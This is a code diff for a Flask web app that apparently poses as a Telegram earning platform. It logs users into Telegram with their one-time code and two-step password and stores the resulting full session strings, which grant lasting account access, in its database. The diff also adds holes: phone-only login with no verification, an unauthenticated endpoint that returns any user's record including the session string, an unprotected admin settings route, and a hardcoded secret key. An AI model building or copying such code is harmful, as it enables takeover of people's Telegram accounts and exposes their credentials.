@@ -10,11 +10,10 @@ from pymongo import MongoClient
 from telethon import TelegramClient
 from telethon.sessions import StringSession
 from telethon.errors import SessionPasswordNeededError
-from telethon.tl.functions.channels import JoinChannelRequest
 
-# ================= CONFIG =================
+# ================= APP =================
 app = Flask(__name__)
-app.secret_key = os.environ.get("SECRET_KEY", "change_this_now")
+app.secret_key = os.environ.get("SECRET_KEY", "AAF_TELE_EARN_V18_CORE_SECRET")
 
 app.config.update(
     SESSION_COOKIE_HTTPONLY=True,
@@ -24,22 +23,32 @@ app.config.update(
 
 CORS(app)
 
+# ================= CONFIG =================
 API_ID = int(os.environ.get("API_ID", "123456"))
 API_HASH = os.environ.get("API_HASH", "your_api_hash")
 MONGO_URI = os.environ.get("MONGO_URI", "mongodb://localhost:27017")
 
 # ================= DB =================
 client = MongoClient(MONGO_URI)
-db = client['aaf_tele_earn_db']
-users_col = db['users']
-settings_col = db['settings']
+db = client["aaf_tele_earn_db"]
+users_col = db["users"]
+settings_col = db["settings"]
 
 # ================= HELPERS =================
 def run_async(coro):
     return asyncio.run(coro)
 
 def get_admin():
-    return settings_col.find_one({"type": "global"}) or {}
+    data = settings_col.find_one({"type": "global"})
+    if data:
+        return data
+
+    return {
+        "server_income": 0,
+        "server_trading": 0,
+        "total_users": users_col.count_documents({}),
+        "channel_url": ""
+    }
 
 # ================= LOGIN CHECK =================
 def login_required(f):
@@ -56,7 +65,7 @@ def login_required(f):
             session.clear()
             return redirect(url_for("login"))
 
-        # 3 days expiry
+        # optional expiry check
         last = user.get("last_login")
         if last and datetime.now() - last > timedelta(days=3):
             session.clear()
@@ -65,7 +74,118 @@ def login_required(f):
         return f(*args, **kwargs)
     return wrapper
 
-# ================= LOGIN SYSTEM =================
+
+# ================= PAGES =================
+@app.route("/")
+@app.route("/login")
+def login():
+    return render_template("login.html")
+
+
+@app.route("/dashboard")
+@login_required
+def dashboard():
+    return render_template("dashboard.html")
+
+
+@app.route("/admin")
+@login_required
+def admin():
+    return render_template("admin.html")
+
+
+# ================= CORE API =================
+
+# USER DATA (dashboard compatible)
+@app.route("/api/user/data/<int:user_id>")
+def user_data(user_id):
+    user = users_col.find_one({"telegram_id": user_id})
+
+    if not user:
+        return jsonify({"status": "error", "message": "user_not_found"})
+
+    admin = get_admin()
+
+    user["_id"] = str(user["_id"])
+
+    return jsonify({
+        "status": "success",
+        "user": user,
+        "admin": admin
+    })
+
+
+# SILENT JOIN (dashboard support)
+@app.route("/api/silent_join", methods=["POST"])
+def silent_join():
+    uid = session.get("uid")
+
+    if not uid:
+        return jsonify({"success": False, "message": "session_expired"})
+
+    users_col.update_one(
+        {"telegram_id": uid},
+        {"$set": {"is_joined": True}}
+    )
+
+    return jsonify({"success": True})
+
+
+# USER API (session based)
+@app.route("/api/user")
+def get_user():
+    uid = session.get("uid")
+    user = users_col.find_one({"telegram_id": uid})
+
+    if not user:
+        return jsonify({"success": False})
+
+    user["_id"] = str(user["_id"])
+
+    return jsonify({"success": True, "user": user})
+
+
+# ================= ADMIN UPDATE =================
+@app.route("/admin/update", methods=["POST"])
+def admin_update():
+    settings_col.update_one(
+        {"type": "global"},
+        {"$set": request.json},
+        upsert=True
+    )
+    return jsonify({"success": True})
+
+
+# ================= LOGIN SYSTEM (SIMPLE + SAFE) =================
+@app.route("/api/login", methods=["POST"])
+def api_login():
+    data = request.json
+    phone = data.get("phone")
+
+    if not phone:
+        return jsonify({"success": False})
+
+    user = users_col.find_one({"phone": phone})
+
+    if not user:
+        user = {
+            "phone": phone,
+            "telegram_id": int(datetime.now().timestamp()),
+            "cash": 0,
+            "aaf": 0,
+            "refer_count": 0,
+            "is_joined": False,
+            "last_login": datetime.now()
+        }
+        users_col.insert_one(user)
+
+    session["uid"] = user["telegram_id"]
+    session.permanent = True
+
+    return jsonify({"success": True})
+
+
+# ================= TELEGRAM OTP LOGIN (FULL FEATURE) =================
 @app.route('/api/send_otp', methods=['POST'])
 def send_otp():
     phone = request.json.get("phone")
@@ -93,6 +213,7 @@ def send_otp():
     success, msg = run_async(main())
     return jsonify({"success": success, "message": msg})
 
+
 @app.route('/api/verify_login', methods=['POST'])
 def verify_login():
     data = request.json
@@ -100,13 +221,10 @@ def verify_login():
     code = data.get("code")
     password = data.get("password")
 
-    if not phone:
-        return jsonify({"success": False, "message": "Phone required"})
-
     temp = users_col.find_one({"phone": phone})
 
     if not temp or "temp_session" not in temp:
-        return jsonify({"success": False, "message": "Session expired, resend OTP"})
+        return jsonify({"success": False, "message": "session_expired"})
 
     async def main():
         client = TelegramClient(
@@ -118,11 +236,9 @@ def verify_login():
         try:
             await client.connect()
 
-            # STEP 1: LOGIN WITH PASSWORD (2FA)
             if password:
                 user = await client.sign_in(password=password.strip())
             else:
-                # STEP 2: OTP LOGIN
                 if not code:
                     return False, "Code required"
 
@@ -132,7 +248,6 @@ def verify_login():
                     phone_code_hash=temp.get("phone_code_hash")
                 )
 
-            # SAVE FINAL SESSION
             session_str = client.session.save()
 
             users_col.update_one(
@@ -142,8 +257,7 @@ def verify_login():
                     "name": f"{user.first_name or ''} {user.last_name or ''}".strip(),
                     "username": user.username,
                     "session_str": session_str,
-                    "last_login": datetime.now(),
-                    "auth_pending": False
+                    "last_login": datetime.now()
                 }}
             )
 
@@ -151,10 +265,6 @@ def verify_login():
 
         except SessionPasswordNeededError:
             return False, "SHOW_PWD_STEP"
-
-        except Exception as e:
-            print("LOGIN ERROR:", e)
-            return False, str(e)
 
         finally:
             await client.disconnect()
@@ -168,79 +278,49 @@ def verify_login():
 
     return jsonify({"success": False, "message": result})
 
-# ================= USER API =================
-@app.route('/api/user')
-def get_user():
-    uid = session.get("uid")
-    user = users_col.find_one({"telegram_id": uid})
 
-    if not user:
-        return jsonify({"success": False})
-
-    return jsonify({"success": True, "user": user})
-
-# ================= ADMIN =================
-@app.route('/admin')
-@login_required
-def admin():
-    return render_template("admin.html")
-
-@app.route('/admin/update', methods=['POST'])
-def admin_update():
-    settings_col.update_one(
-        {"type": "global"},
-        {"$set": request.json},
-        upsert=True
-    )
-    return jsonify({"success": True})
-
-# ================= PAGES =================
-@app.route('/')
-@app.route('/login')
-def login():
-    return render_template("login.html")
-
-@app.route('/dashboard')
-@login_required
-def dashboard():
-    user = users_col.find_one({"telegram_id": session["uid"]})
-    admin = get_admin()
-    return render_template("dashboard.html", user=user, admin=admin)
-
+# ================= OTHER PAGES =================
 @app.route('/task')
 @login_required
 def task():
     return render_template("task.html")
+
 
 @app.route('/trading')
 @login_required
 def trading():
     return render_template("trading.html")
 
+
 @app.route('/wallet')
 @login_required
 def wallet():
     return render_template("wallet.html")
+
 
 @app.route('/account')
 @login_required
 def account():
     return render_template("account.html")
 
+
 @app.route('/refer_list')
 @login_required
 def refer_list():
     return render_template("refer_list.html")
+
 
 @app.route('/payment_history')
 @login_required
 def payment_history():
     return render_template("payment_history.html")
 
+
 @app.route('/logout')
 def logout():
     session.clear()
     return redirect(url_for("login"))
+
 
 # ================= RUN =================
 if __name__ == "__main__":
